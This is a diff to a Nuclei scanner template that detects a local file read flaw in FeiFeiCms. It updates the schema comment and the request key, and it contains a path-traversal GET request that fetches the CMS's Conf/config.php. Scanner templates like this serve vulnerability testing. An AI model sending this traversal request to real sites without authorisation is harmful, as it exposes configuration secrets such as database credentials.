@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: feifeicms-lfr
 info:
   name: FeiFeiCms Local File Read
@@ -7,7 +8,7 @@ info:
   reference: |
     - https://www.cnblogs.com/jinqi520/p/10202615.html
     - https://gitee.com/daicuo/feifeicms
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/index.php?s=Admin-Data-down&id=../../Conf/config.php"
